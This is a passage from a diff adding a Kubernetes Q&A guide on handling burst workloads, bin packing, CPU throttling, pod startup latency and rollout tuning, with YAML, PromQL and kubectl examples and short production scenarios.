+  sum(kube_node_status_allocatable{resource="cpu"}) by (node)
+```
+
+Target: 60-70% actual utilization, requests near 100% (well-packed).
+
+**Production scenarios:**
+
+1. **Conservative led to over-provisioning**: All pods set with requests = limits (Guaranteed). Average utilization 30%. Migrated to 2x overcommit on CPU, 1.5x on memory. Utilization to 60%. Same workload, 30% fewer nodes.
+
+2. **Aggressive overcommit caused OOM cascade**: Memory overcommit 3x. During traffic spike, multiple OOMs. Cascade as workloads couldn't keep up. Backed off to 1.5x. Stable.
+
+3. **Mixed-QoS for batch**: Batch jobs as BestEffort filled gaps on Guaranteed-pod nodes. Improved utilization without affecting critical workloads.
+
+4. **VPA-driven right-sizing**: Used VPA recommendations to set realistic requests. Most workloads were over-requesting. Right-sized → fewer nodes needed, similar performance.
+
+5. **Per-environment overcommit**: Production: conservative (1:2 max). Staging: standard (1:5). Dev: aggressive (1:10). Different risk tolerance per environment.
+
+---
+
+## 214. How do you handle burst workloads?
+
+Burst workloads have rapid, high-magnitude load increases (10x, 100x normal). Handling them requires planning beyond simple autoscaling.
+
+**Types of bursts:**
+
+**Burst type 1: Predictable**
+
+Known schedule:
+- Black Friday for e-commerce
+- Sports events for streaming
+- Tax day for tax services
+- Daily peak hours
+
+**Burst type 2: Unpredictable**
+
+Random:
+- Viral content
+- News events causing traffic
+- DDoS or attack
+- Bot traffic
+
+**Burst type 3: Seasonal**
+
+Periodic but slower:
+- Quarterly batch processing
+- Year-end reports
+- Holiday seasons
+
+Each requires different handling.
+
+**Challenges with bursts:**
+
+**Challenge 1: Scaling speed**
+
+Default autoscaling:
+- HPA: 15-60s reaction
+- Cluster autoscaler: 1-5 min (new nodes)
+
+A 10x burst in 30 seconds can't be handled reactively.
+
+**Challenge 2: Cold start**
+
+New pods need to start:
+- Image pull: 5-30s
+- Container start: 5-30s
+- Application warmup: 0-60s
+
+Total: 30s - 2 min before pod is useful.
+
+**Challenge 3: Downstream capacity**
+
+Scaling app doesn't scale dependencies:
+- Database connections
+- Cache capacity
+- External APIs
+
+**Challenge 4: Cost**
+
+Provisioning for peak = expensive 90% of time.
+
+**Strategies for burst handling:**
+
+**Strategy 1: Pre-scaling for predictable bursts**
+
+```yaml
+# KEDA cron-based scaling:
+triggers:
+  - type: cron
+    metadata:
+      timezone: America/Los_Angeles
+      start: "0 8 * * 1-5"      # 8 AM weekdays
+      end: "0 18 * * 1-5"       # 6 PM weekdays
+      desiredReplicas: "20"
+```
+
+Pre-scale before known events. No reactive lag.
+
+**Strategy 2: Aggressive scaling policies**
+
+```yaml
+behavior:
+  scaleUp:
+    stabilizationWindowSeconds: 0
+    policies:
+      - type: Percent
+        value: 100        # Double pods
+        periodSeconds: 60
+      - type: Pods
+        value: 20         # Or add 20
+        periodSeconds: 60
+    selectPolicy: Max
+```
+
+Fast scale-up to react to bursts.
+
+**Strategy 3: Buffer capacity**
+
+Always have headroom:
+
+```yaml
+minReplicas: 10   # Way more than typical load
+```
+
+More capacity than needed normally. Absorbs small bursts. Costly.
+
+**Strategy 4: Queue-based decoupling**
+
+Don't process burst in real-time. Queue it:
+
+```
+Burst traffic → Load balancer → Queue → Workers
+```
+
+Queue absorbs burst. Workers process at sustainable rate.
+
+Examples:
+- SQS, Kafka for async tasks
+- Redis queue for jobs
+- Celery for distributed tasks
+
+**Strategy 5: Caching**
+
+Bursts often hit same data:
+
+```
+Burst traffic → CDN → Cache (Redis) → Database
+```
+
+Cache absorbs most reads. Database protected.
+
+Cache strategies:
+- CDN for static content
+- Redis for dynamic content
+- Application-level caches
+
+**Strategy 6: Rate limiting**
+
+Don't try to serve all burst traffic. Limit it:
+
+```yaml
+# Ingress rate limiting (NGINX):
+metadata:
+  annotations:
+    nginx.ingress.kubernetes.io/limit-rps: "100"   # 100 req/sec
+```
+
+Excess requests dropped or queued. Protects backends.
+
+**Strategy 7: Spot/preemptible instances**
+
+For batch burst workloads:
+
+```yaml
+# Node group with spot instances:
+spec:
+  spec:
+    instanceTypes:
+      - m5.large
+    capacityType: SPOT
+```
+
+Cheap capacity for burst. May be reclaimed (acceptable for batch).
+
+**Strategy 8: Burstable cloud services**
+
+AWS Lambda, Cloud Run, etc.:
+- Infinite scale (cloud-managed)
+- Pay per request
+- Cold start but fast
+- For specific workload types
+
+Burst goes to serverless, baseline to Kubernetes.
+
+**Strategy 9: Graceful degradation**
+
+When overwhelmed, degrade gracefully:
+
+- Return cached content
+- Reduce feature set
+- Show "service degraded" page
+- Queue requests for later
+
+Better than complete failure.
+
+**Strategy 10: Circuit breakers**
+
+Stop calling failing dependencies:
+
+```python
+@circuit_breaker(failure_threshold=10, recovery_timeout=30)
+def call_db():
+    return db.query(...)
+```
+
+Fail fast when downstream overwhelmed. Prevent cascade.
+
+**Architecture patterns:**
+
+**Pattern 1: Buffer + workers**
+
+```
+Internet → ALB → Web servers (limited)
+                  ↓
+                 Queue
+                  ↓
+                 Workers (auto-scale)
+                  ↓
+                 Database
+```
+
+Web servers handle requests immediately, queue work. Workers process at sustainable rate.
+
+**Pattern 2: Cache-heavy**
+
+```
+Internet → CDN (handles burst) → ALB → Application (sustained load)
+```
+
+CDN takes 90%+ of burst. Application sees manageable load.
+
+**Pattern 3: Tiered scaling**
+
+```
+Always-on: 10 replicas (baseline)
++ HPA: scales to 30 (slow bursts)
++ Lambda: handles excess (spike traffic)
+```
+
+Multiple tiers handle different burst characteristics.
+
+**Pre-scaling automation:**
+
+For predictable patterns:
+
+```yaml
+# KEDA with multiple triggers:
+triggers:
+  - type: cron
+    metadata:
+      start: "0 8 * * *"    # Daily 8 AM
+      end: "0 22 * * *"     # Daily 10 PM
+      desiredReplicas: "20"
+  - type: cpu
+    metadata:
+      type: Utilization
+      value: "70"
+```
+
+Cron sets minimum during business hours; CPU scales further as needed.
+
+**Capacity planning:**
+
+For bursts:
+
+1. **Identify burst patterns**: data analysis of past traffic
+2. **Quantify peak**: typical peak, worst-case peak
+3. **Plan capacity**: peak × buffer (often 1.5x peak)
+4. **Test capacity**: load testing at planned peak
+
+**Capacity = baseline + burst absorption capability**
+
+**Pre-warmed pools:**
+
+Have pods ready before needed:
+
+```yaml
+# Multiple replicas always ready for burst:
+spec:
+  replicas: 20    # Always
+  
+# Even if normal load needs only 5
+```
+
+Trade-off: cost vs. responsiveness.
+
+**Production scenarios:**
+
+1. **Black Friday pre-scaling**: E-commerce site. Started scaling 2 hours before peak. Used cron-based scaling. Manual scaling for predicted multi-x peak. Zero issues during sale.
+
+2. **Viral content**: News site. Article went viral. 100x normal traffic in 5 minutes. HPA couldn't react fast enough. Pods crashed. Implemented aggressive cache + CDN. Survived next viral event.
+
+3. **Queue-based for image processing**: User uploads bursts. Direct processing overwhelmed system. Implemented SQS queue. Web tier just queues. Workers process at sustainable rate.
+
+4. **Spot instances for batch**: Daily analytics burst. Used Spot instances. 70% cost savings. Occasionally reclaimed, jobs retried. Acceptable for batch.
+
+5. **Rate limiting saved backends**: API gateway received DDoS. Without rate limits, backends would have crashed. Per-IP rate limit dropped attack traffic. Legitimate traffic continued.
+
+---
+
+## 215. Explain bin packing strategies
+
+Bin packing determines how pods are placed onto nodes. Better bin packing = better resource utilization = lower cost.
+
+**The bin packing problem:**
+
+Given:
+- Pods of various sizes (CPU, memory requests)
+- Nodes of various sizes
+
+Goal: Fit pods onto fewest nodes possible.
+
+Classic computer science problem. NP-hard in general.
+
+**Strategies in Kubernetes:**
+
+**Strategy 1: Best Fit Decreasing**
+
+Default scheduler doesn't do this explicitly, but the concept:
+- Pack pods densely on fewer nodes
+- Like Tetris
+
+```yaml
+# Scheduler with MostAllocated scoring:
+profiles:
+  - schedulerName: bin-packing
+    plugins:
+      score:
+        enabled:
+          - name: NodeResourcesFit
+            args:
+              scoringStrategy:
+                type: MostAllocated
+```
+
+Favors nodes that are already heavily allocated.
+
+**Strategy 2: Spreading (default)**
+
+Default scheduler spreads pods across nodes:
+
+```
+LeastAllocated scoring:
+- Pods on lightly-loaded nodes
+- Better HA (one failure affects fewer pods)
+- Worse bin packing
+```
+
+Trade-off: HA vs. utilization.
+
+**Strategy 3: Karpenter**
+
+Karpenter is more sophisticated than Cluster Autoscaler:
+
+- Provisions nodes sized for pending pods
+- Eliminates fragmentation issues
+- Consolidates workloads onto fewer nodes
+
+```yaml
+spec:
+  consolidationPolicy: WhenUnderutilized
+```
+
+Karpenter actively moves pods to fewer nodes when possible.
+
+**Strategy 4: Pod priorities**
+
+```yaml
+apiVersion: scheduling.k8s.io/v1
+kind: PriorityClass
+metadata:
+  name: critical
+value: 1000000
+
+---
+apiVersion: scheduling.k8s.io/v1
+kind: PriorityClass
+metadata:
+  name: batch
+value: 100
+```
+
+Critical pods scheduled first. Lower priority pods can be preempted to make room.
+
+**Strategy 5: Descheduler**
+
+Periodically rebalance:
+
+```yaml
+strategies:
+  RemovePodsViolatingNodeAffinity:
+    enabled: true
+  LowNodeUtilization:
+    enabled: true
+    params:
+      nodeResourceUtilizationThresholds:
+        thresholds:
+          cpu: 20
+          memory: 20
+```
+
+Evicts pods from underutilized nodes; reschedules to better fit nodes.
+
+**Fragmentation:**
+
+Bin packing fails when resources are fragmented:
+
+```
+Node 1: 2 CPU free
+Node 2: 2 CPU free
+Node 3: 2 CPU free
+
+Pod requesting 4 CPU: can't fit despite 6 CPU total free
+```
+
+Solutions:
+- Larger node sizes (less fragmentation)
+- Descheduler (consolidate)
+- Karpenter consolidation
+- Pod resizing (smaller requests if possible)
+
+**Node sizing strategy:**
+
+**Small nodes:**
+
+```
+20 nodes × 4 CPU = 80 CPU total
+Pros: granular scaling, smaller blast radius
+Cons: more fragmentation, more nodes to manage
+```
+
+**Large nodes:**
+
+```
+5 nodes × 16 CPU = 80 CPU total
+Pros: less fragmentation, fewer nodes
+Cons: bigger blast radius, less granular
+```
+
+**Recommendation:**
+
+Use mixed sizes. Different node groups for different workloads:
+
+- Standard workloads: medium nodes
+- High-memory workloads: high-memory nodes
+- GPU workloads: GPU nodes
+
+**Workload-aware packing:**
+
+**Co-locate complementary workloads:**
+
+Pods with different resource profiles pack well together:
+
+```
+Pod A: 4 CPU, 1 GB memory   (CPU-heavy)
+Pod B: 1 CPU, 8 GB memory   (memory-heavy)
+
+Together: 5 CPU, 9 GB memory
+On node with 8 CPU, 16 GB: efficient packing
+```
+
+**Separate similar workloads:**
+
+```
+Three CPU-heavy pods (4 CPU each) on a 12-CPU node:
+Maxes out CPU, memory underutilized
+```
+
+Use anti-affinity to spread these out.
+
+**Anti-affinity for fragmentation prevention:**
+
+```yaml
+podAntiAffinity:
+  preferredDuringSchedulingIgnoredDuringExecution:
+    - weight: 100
+      podAffinityTerm:
+        labelSelector:
+          matchLabels:
+            workload-type: cpu-intensive
+        topologyKey: kubernetes.io/hostname
+```
+
+Spreads CPU-intensive workloads, allowing other workloads to fill gaps.
+
+**Spot instance integration:**
+
+```yaml
+# Node group for spot:
+spec:
+  capacityType: SPOT
+  taints:
+    - key: spot
+      effect: NoSchedule
+
+# Pods that tolerate spot:
+tolerations:
+  - key: spot
+    operator: Equal
+    value: "true"
+    effect: NoSchedule
+```
+
+Burst into spot capacity, baseline on on-demand.
+
+**Multi-tier nodes:**
+
+```yaml
+# Tier 1: critical workloads
+node group: critical
+no-spot, dedicated, larger
+
+# Tier 2: standard workloads
+node group: standard
+mixed, medium
+
+# Tier 3: batch
+node group: batch
+spot, large, taints
+```
+
+Different bin packing requirements per tier.
+
+**Monitoring bin packing efficiency:**
+
+```promql
+# Cluster utilization:
+sum(rate(container_cpu_usage_seconds_total[5m])) /
+  sum(kube_node_status_allocatable{resource="cpu"})
+
+# Request utilization:
+sum(kube_pod_container_resource_requests{resource="cpu"}) /
+  sum(kube_node_status_allocatable{resource="cpu"})
+```
+
+Target: 70-80% request utilization, 60-70% actual utilization.
+
+**Common issues:**
+
+**Issue 1: Pods Pending with cluster free capacity**
+
+Fragmentation. Solutions:
+- Descheduler
+- Karpenter consolidation
+- Larger nodes
+
+**Issue 2: Node count high for workload**
+
+Poor bin packing. Solutions:
+- Right-size requests (VPA recommendations)
+- Adjust scoring strategy
+- Use Karpenter
+
+**Issue 3: Some nodes hot, others cool**
+
+Uneven distribution. Solutions:
+- Anti-affinity
+- Topology spread
+- Descheduler
+
+**Karpenter vs Cluster Autoscaler:**
+
+CA: scales node groups (predefined templates)
+Karpenter: provisions right-sized nodes dynamically
+
+For bin packing, Karpenter typically better:
+- Matches node size to pending pods
+- Consolidates workloads
+- Less waste
+
+**Production scenarios:**
+
+1. **Migrated to Karpenter**: CA-managed cluster had 30% wasted capacity. Karpenter with consolidation reduced node count by 25%. Same workload, less infrastructure.
+
+2. **Descheduler rebalanced cluster**: Over time, cluster became unbalanced. Some nodes at 80%, others at 20%. Descheduler with LowNodeUtilization rebalanced. Better packing.
+
+3. **Right-sized requests**: VPA recommendations showed most workloads over-requesting 3-4x. Right-sized requests. Cluster utilization went from 40% to 70%.
+
+4. **Different node groups per workload**: GPU nodes for ML, high-memory for caching, standard for web. Each group well-packed for its workload type.
+
+5. **Topology spread for HA + packing**: Used topology spread (preferred) instead of hard anti-affinity. HA maintained, but allowed flexible packing. Best of both worlds.
+
+---
+
+## 216. What causes CPU throttling?
+
+CPU throttling occurs when a container hits its CPU limit and the kernel restricts further CPU usage. This causes application latency without visible CPU saturation.
+
+**How CPU limits work:**
+
+Linux uses CFS (Completely Fair Scheduler) with bandwidth limits:
+
+```
+CPU limit = 500m = 500 millicores = 0.5 CPU
+```
+
+Kernel enforces in periods (default 100ms):
+- 100ms period
+- 0.5 CPU limit = 50ms CPU time per period
+- After 50ms used, container throttled until next period
+
+**The throttling problem:**
+
+Even with low average CPU, you can hit throttling:
+
+```
+Period 1: container does heavy work, uses 50ms in first 10ms → throttled 90ms
+Period 2: container idle, uses 0ms
+Period 3: container does heavy work, throttled again
+
+Average CPU: 5% (well below limit)
+But: throttled in some periods
+```
+
+**Detection:**
+
+```promql
+# Throttled time ratio:
+rate(container_cpu_cfs_throttled_periods_total[5m]) /
+  rate(container_cpu_cfs_periods_total[5m])
+```
+
+If > 0.1 (10% of periods throttled), problem.
+
+```bash
+# In pod:
+cat /sys/fs/cgroup/cpu/cpu.stat
+# nr_periods 1000
+# nr_throttled 234       # 23% throttling
+# throttled_time 12345678   # ns
+```
+
+**Causes of throttling:**
+
+**Cause 1: CPU limit too low**
+
+Obvious case. Increase the limit:
+
+```yaml
+resources:
+  limits:
+    cpu: 2000m   # Up from 500m
+```
+
+**Cause 2: Burst behavior**
+
+Application has periodic CPU spikes:
+- GC cycles
+- Compaction
+- Batch operations
+
+Even with low average, spikes hit limit.
+
+Solutions:
+- Higher limit
+- Smooth out spikes (incremental work)
+
+**Cause 3: Multi-threaded apps with shared CPU**
+
+Java application with 100 threads on container with 0.5 CPU limit:
+
+```
+100 threads compete for 0.5 CPU
+Each thread gets 5ms of CPU per second
+Heavy context switching
+Throttling on bursts
+```
+
+JVM might think it has many CPUs (Runtime.availableProcessors), starts many threads. Container limit makes this counterproductive.
+
+Solutions:
+- Configure JVM for container-aware:
+  ```bash
+  -XX:ActiveProcessorCount=2
+  ```
+- Tune thread pool sizes
+
+**Cause 4: CPU manager policy issues**
+
+Default CPU manager allocates fractional CPU. Some workloads need full cores:
+
+```yaml
+# Static CPU manager + Guaranteed QoS:
+resources:
+  limits:
+    cpu: "2"   # Integer = full cores
+    memory: 1Gi
+  requests:
+    cpu: "2"
+    memory: 1Gi
+```
+
+Pod gets dedicated CPU cores. No throttling on those cores.
+
+**Cause 5: Noisy neighbor**
+
+Other pods on node consuming CPU. Even with proper limits, contention affects performance.
+
+Solutions:
+- Better bin packing
+- Resource requests (reserves capacity)
+- Anti-affinity
+
+**Cause 6: Period mismatch**
+
+Short bursts within long periods cause throttling.
+
+Default period 100ms. For very burst-y workloads:
+
+```yaml
+# Shorter periods reduce throttling impact for bursts:
+# (Requires kernel configuration)
+```
+
+Not easily tunable in Kubernetes.
+
+**The CPU limits debate:**
+
+Some advocate removing CPU limits entirely:
+
+**Arguments for no limits:**
+- Eliminates throttling
+- Better performance
+- Apps use idle CPU efficiently
+
+**Arguments for limits:**
+- Prevents runaway processes
+- Predictable resource usage
+- Cost allocation
+
+**Common approach:**
+- Set requests (scheduling guarantees)
+- Skip limits (allow bursting)
+- Use anti-affinity to prevent monopolization
+
+```yaml
+resources:
+  requests:
+    cpu: 500m   # Reserved capacity
+  # No limits = no throttling
+```
+
+Risk: a runaway pod can consume all node CPU.
+
+**Solutions to throttling:**
+
+**Solution 1: Right-size limits**
+
+Measure actual usage:
+
+```promql
+# P99 CPU usage:
+quantile_over_time(0.99,
+  rate(container_cpu_usage_seconds_total[1m])[7d:1m]
+)
+```
+
+Set limits above P99.
+
+**Solution 2: Remove limits (carefully)**
+
+For latency-sensitive workloads, no limit might be best:
+
+```yaml
+resources:
+  requests:
+    cpu: 500m
+  # No limits
+```
+
+Combined with:
+- Pod anti-affinity (prevent co-location)
+- Quality monitoring
+- Cluster capacity headroom
+
+**Solution 3: Static CPU manager**
+
+For ultra-low latency:
+
+```yaml
+# Kubelet config:
+cpuManagerPolicy: static
+
+# Pod:
+resources:
+  limits:
+    cpu: "4"   # Integer
+    memory: 4Gi
+  requests:
+    cpu: "4"
+    memory: 4Gi
+```
+
+Dedicated cores, no contention.
+
+**Solution 4: JVM tuning**
+
+```bash
+# JVM container-aware:
+-XX:+UseContainerSupport   # Default in Java 10+
+-XX:ActiveProcessorCount=2 # If you want to override
+-XX:MaxRAMPercentage=70
+```
+
+**Solution 5: Application changes**
+
+- Reduce thread pool sizes
+- Less concurrent work
+- Smoother CPU usage (no spikes)
+
+**Detection workflow:**
+
+1. **Alert on high throttling:**
+```promql
+rate(container_cpu_cfs_throttled_periods_total[5m]) /
+  rate(container_cpu_cfs_periods_total[5m]) > 0.1
+```
+
+2. **Identify affected pods**
+
+3. **Analyze CPU pattern:**
+```promql
+rate(container_cpu_usage_seconds_total[1m])
+```
+
+Is it constant high or spiky?
+
+4. **Decide:**
+- Constant high: raise limit
+- Spiky: raise limit or remove
+- Multi-threaded issue: tune app
+
+**Trade-offs:**
+
+**With limits + throttling:**
+- Predictable resource usage
+- Performance impact
+
+**Without limits:**
+- No throttling
+- Resource hog risk
+
+Most workloads: skip limits for production services, set for batch/untrusted.
+
+**Production scenarios:**
+
+1. **Java GC throttling**: Spring Boot app with 500m CPU limit. GC pauses caused throttling. P99 latency 5x P50. Removed CPU limit. Latency normalized.
+
+2. **High thread count cascade**: Application used CompletableFuture with ForkJoinPool. JVM saw 16 vCPUs, made 16 threads. Container limit was 1 CPU. Threads thrashed, throttled. Set ActiveProcessorCount=1. Fixed.
+
+3. **Latency-sensitive service**: Trading platform. Removed CPU limits + used static CPU manager. Dedicated cores. P99 latency improved 5x.
+
+4. **Bursty batch jobs**: Hourly batch did intense work for 10s. Throttling caused jobs to take longer. Set limits to 4 CPU (vs 1). Jobs completed in 30% time.
+
+5. **Noisy neighbor problem**: Production pod throttled despite low average usage. Investigation found dev pod on same node spiking CPU. Anti-affinity rules prevented co-location.
+
+---
+
+## 217. Explain Pod startup latency troubleshooting
+
+Pod startup latency (time from pod creation to running) affects scaling responsiveness, deployment speed, and incident recovery time.
+
+**Pod startup stages:**
+
+```
+1. Pod created (API server)
+2. Scheduled to node
+3. Image pulled
+4. Container created
+5. Init containers run
+6. Main container starts
+7. Readiness probe passes
+8. Pod marked "Ready"
+```
+
+Each stage has potential delays.
+
+**Measuring stages:**
+
+```promql
+# Stage 1-2: Scheduling latency
+histogram_quantile(0.99,
+  rate(scheduler_pod_scheduling_duration_seconds_bucket[5m])
+)
+
+# Stage 3: Image pull
+histogram_quantile(0.99,
+  rate(kubelet_runtime_operations_duration_seconds_bucket{operation_type="pull_image"}[5m])
+)
+
+# Stage 1-7: Overall pod startup
+histogram_quantile(0.99,
+  rate(kubelet_pod_start_duration_seconds_bucket[5m])
+)
+```
+
+**Common latency sources:**
+
+**Source 1: Scheduling delays**
+
+```bash
+kubectl describe pod my-pod
+# Events:
+#   Warning  FailedScheduling  2m  ...
+#   Normal   Scheduled         1m  Successfully assigned ...
+```
+
+Causes:
+- No matching node (resource, taints, affinity)
+- Cluster autoscaler provisioning
+- Scheduler busy
+
+Diagnosis:
+```bash
+# What's pending?
+kubectl get pods --field-selector status.phase=Pending
+
+# Why?
+kubectl describe pod <pod>
+```
+
+**Source 2: Image pull**
+
+Often the longest stage:
+
+```bash
+kubectl describe pod my-pod
+# Events:
+#   Normal  Pulling  1m  Pulling image "my-app:v1"
+#   Normal  Pulled   30s Successfully pulled (took 30.5s)
+```
+
+Causes:
+- Large image
+- Slow registry
+- Cold node (no cached image)
+- Network bandwidth
+
+Mitigations:
+- Smaller images (multi-stage builds)
+- Image registry mirror
+- Pre-pull images on nodes
+- Lazy loading (eStargz, SOCI)
+
+**Source 3: Init containers**
+
+Sequential init containers add up:
+
+```yaml
+spec:
+  initContainers:
+    - name: wait-for-db    # 10s
+    - name: migrate-db     # 30s
+    - name: load-config    # 5s
+# Total: 45s before main container starts
+```
+
+Optimizations:
+- Combine init logic
+- Use background processes
+- Move logic to main container (with readiness check)
+
+**Source 4: Container start time**
+
+```bash
+# In pod:
+ls -la /proc/1/cmdline   # When did process start?
+```
+
+Application startup time:
+- JIT compilation (Java, .NET)
+- Class loading
+- Configuration loading
+- Connection establishment
+
+**Source 5: Readiness probe delays**
+
+```yaml
+readinessProbe:
+  initialDelaySeconds: 30   # Wait 30s before first probe
+  periodSeconds: 10
+  failureThreshold: 3
+```
+
+Pod might be ready at 5s but probe waits 30s.
+
+Fix:
+- Use startupProbe + readinessProbe
+- Tune initialDelaySeconds
+
+**Source 6: Volume mounts**
+
+```bash
+kubectl describe pod my-pod
+# Events:
+#   Normal  Pulled     ... 
+#   Warning FailedMount 30s ... MountVolume.SetUp failed
+#   Normal  Pulled     1m  ...
+```
+
+Causes:
+- CSI driver issues
+- Cloud provider attach time
+- Network storage slow
+
+**Optimization strategies:**
+
+**Strategy 1: Smaller, faster images**
+
+```dockerfile
+# Multi-stage build:
+FROM node:18 AS builder
+COPY . .
+RUN npm install && npm run build
+
+FROM gcr.io/distroless/nodejs:18
+COPY --from=builder /dist /app
+CMD ["/app/index.js"]
+```
+
+Smaller images pull faster.
+
+**Strategy 2: Image pre-pulling**
+
+DaemonSet that pre-pulls images:
+
+```yaml
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: image-prepuller
+spec:
+  template:
+    spec:
+      initContainers:
+        - name: prepull
+          image: my-app:v1
+          command: ["true"]
+      containers:
+        - name: pause
+          image: registry.k8s.io/pause:3.9
+```
+
+New nodes have images cached.
+
+**Strategy 3: Optimize application startup**
+
+For JVMs:
+- CDS (Class Data Sharing)
+- AOT compilation (GraalVM)
+- Reduce dependencies
+
+For Python:
+- Pre-compiled .pyc
+- Minimize imports
+
+For Go/Rust:
+- Native binaries (fast startup)
+
+**Strategy 4: Tune probes**
+
+```yaml
+startupProbe:
+  httpGet:
+    path: /healthz
+    port: 8080
+  periodSeconds: 1     # Check every second
+  failureThreshold: 30  # Allow 30s total
+
+readinessProbe:
+  httpGet:
+    path: /ready
+    port: 8080
+  periodSeconds: 5
+  failureThreshold: 3
+```
+
+startupProbe for slow start, readinessProbe for ongoing.
+
+**Strategy 5: Parallel image pulls**
+
+```yaml
+# kubelet config:
+serializeImagePulls: false
+maxParallelImagePulls: 5
+```
+
+Default: serial pulls. Parallel can speed up.
+
+**Strategy 6: Lazy loading**
+
+For very large images:
+
+```yaml
+# AWS Bottlerocket with SOCI:
+# Or: eStargz on containerd
+```
+
+Container starts before full image download.
+
+**Strategy 7: Cluster autoscaler optimization**
+
+```yaml
+# CA flags:
+- --scale-down-delay-after-add=10m
+- --expander=most-pods   # Provision biggest needed node
+```
+
+**Or use Karpenter:**
+
+```yaml
+spec:
+  # Karpenter provisions optimal-sized nodes
+  consolidationPolicy: WhenUnderutilized
+```
+
+Karpenter usually has faster node provisioning than CA.
+
+**Strategy 8: Hot pods**
+
+For latency-critical scaling:
+
+```yaml
+# Keep extra pods always running:
+minReplicas: 5   # Not 1
+```
+
+Burst load uses warm pods. New pod startup happens in background.
+
+**Diagnosing slow startup:**
+
+**Step 1: Identify the slow stage**
+
+```bash
+# Get pod events:
+kubectl get events --field-selector involvedObject.name=<pod-name> \
+  --sort-by='.firstTimestamp'
+
+# Outputs timestamps for each stage
+```
+
+**Step 2: Compare to baseline**
+
+Is this pod slow, or are all pods slow?
+
+```promql
+# Average startup time per deployment:
+avg by (controller_name) (
+  histogram_quantile(0.50,
+    rate(kubelet_pod_start_duration_seconds_bucket[5m])
+  )
+)
+```
+
+**Step 3: Drill into slow stage**
+
+If image pull slow:
+- Check registry health
+- Check node network
+- Check image size
+
+If readiness probe slow:
+- Application logs
+- Probe latency
+
+**Step 4: Profile application**
+
+If app startup itself is slow:
+
+```bash
+# Time within the app:
+# Add logging at key startup points
+# Profile JVM/Python/etc.
+```
+
+**Production scenarios:**
+
+1. **Image pull was 80% of startup**: Production startup 90s. Image pull 70s. Implemented multi-stage build + distroless. Image 1.2 GB → 90 MB. Pull 70s → 5s.
+
+2. **Init container bottleneck**: 4 init containers, 30s each. 2 min before main started. Combined into single init script running tasks in parallel. 30s total.
+
+3. **Slow readiness probe**: App was ready at 5s but probe initialDelaySeconds was 60s. Just tuning probe saved 55s per pod.
+
+4. **Cold start during scale**: HPA scaled from 5 to 50. New pods took 90s. During 90s, existing 5 overwhelmed. Fix: pre-warmed pool (always 10), faster JVM startup.
+
+5. **Karpenter faster than CA**: CA took 5 min to provision nodes. Pending pods accumulated. Migrated to Karpenter. New nodes in 90s. Better scaling response.
+
+---
+
+## 218. How do you optimize deployment rollouts?
+
+Deployment rollouts should be fast (minimize maintenance windows) and safe (catch issues before they spread). Optimization balances both.
+
+**Default rollout strategy:**
+
+Kubernetes default:
+
+```yaml
+spec:
+  strategy:
+    type: RollingUpdate
+    rollingUpdate:
+      maxUnavailable: 25%
+      maxSurge: 25%
+```
+
+For 10-replica deployment:
+- Max 2 pods unavailable
+- Max 12 pods total (2 new + 10 old briefly)
+- Gradual rollover
+
+**Rollout speed factors:**
+
+**Factor 1: maxSurge**
+
+Higher maxSurge = more pods created in parallel:
+
+```yaml
+strategy:
+  rollingUpdate:
+    maxSurge: 50%   # More aggressive
+```
+
+Faster rollout but more resource usage.
+
+**Factor 2: Readiness probes**
+
+Pod must pass readiness before considered "rolled out":
+
+```yaml
+readinessProbe:
+  httpGet:
+    path: /ready
+    port: 8080
+  periodSeconds: 5
+  failureThreshold: 2
+```
+
+Faster probes = faster detected "ready".
+
+**Factor 3: Pod startup time**
+
+Faster pod startup = faster rollout. See Q217.
+
+**Factor 4: terminationGracePeriodSeconds**
+
+```yaml
+spec:
+  terminationGracePeriodSeconds: 30   # Wait up to 30s before killing
+```
+
+Long grace periods slow rollouts.
+
+**Optimization strategies:**
+
+**Strategy 1: Tune maxSurge and maxUnavailable**
+
+For fast rollout, allow more parallelism:
+
+```yaml
+strategy:
+  type: RollingUpdate
+  rollingUpdate:
+    maxSurge: 100%       # Double up to 2x pods briefly
+    maxUnavailable: 0    # Never lose capacity
+```
+
+Pros: very fast, no capacity loss
+Cons: temporarily 2x resources
+
+For limited resources:
+
+```yaml
+rollingUpdate:
+  maxSurge: 0          # No extra pods
+  maxUnavailable: 25%  # Lose some during update
+```
+
+Pros: no extra resources
+Cons: slower, capacity loss
+
+**Strategy 2: Optimize readiness probes**
+
+```yaml
+readinessProbe:
+  httpGet:
+    path: /ready
+    port: 8080
+  periodSeconds: 2      # Check often
+  successThreshold: 1   # One success = ready
+  failureThreshold: 3
+```
+
+But: don't make probes too aggressive (false positives during temporary blips).
+
+**Strategy 3: Pre-pull new images**
+
+Before deploy, pre-pull image on all nodes:
+
+```bash
+# DaemonSet runs init container with new image:
+kubectl apply -f prepuller-daemonset.yaml
+# Wait for completion
+# Then deploy
+```
+
+Eliminates image pull from rollout time.
+
+**Strategy 4: Use blue-green for instant cutover**
+
+For zero-downtime, fast cutover:
+
+```yaml
+# Two deployments:
+# - blue (current)
+# - green (new)
+
+# Service switches selector when green is ready
+```
+
+Tools: Argo Rollouts, Flagger.
+
+```yaml
+apiVersion: argoproj.io/v1alpha1
+kind: Rollout
+spec:
+  strategy:
+    blueGreen:
+      activeService: my-service
+      previewService: my-service-preview
+      autoPromotionEnabled: false   # Manual promotion
+```
+
+Pros: instant cutover, easy rollback
+Cons: 2x resources during rollout
+
+**Strategy 5: Canary rollouts**
+
+Gradual traffic shift:
+
+```yaml
+strategy:
+  canary:
+    steps:
+      - setWeight: 10    # 10% traffic to new
+      - pause: { duration: 5m }
+      - setWeight: 25
+      - pause: { duration: 5m }
+      - setWeight: 50
+      - pause: { duration: 5m }
+      - setWeight: 100
+```
+
+Pros: catch issues early, low blast radius
+Cons: slow rollout
+
+**Strategy 6: Progressive delivery with automated checks**
+
+Tools like Flagger:
+
+```yaml
+spec:
+  canaryAnalysis:
+    threshold: 5
+    maxWeight: 50
+    stepWeight: 10
+    metrics:
+      - name: request-success-rate
+        threshold: 99
+      - name: request-duration
+        threshold: 500
+```
+
+Auto-rollback if metrics degrade. Auto-progress if metrics good.
+
+**Strategy 7: Avoid stuck rollouts**
+
+```yaml
+spec:
+  progressDeadlineSeconds: 600   # Fail after 10 min
+```
+
+If rollout doesn't complete in time, marked failed. Triggers alerts.
+
+**Strategy 8: Pre-warm new pods**
+
+If pods need warmup before serving:
+
+```yaml
+# Custom warmup logic:
+postStart:
+  exec:
+    command: ["/warmup.sh"]   # Cache priming, JIT triggering
+
+# Or:
+readinessProbe:
+  # Don't return ready until warmed up
+```
+
+**Strategy 9: Disruption budget**
+
+```yaml
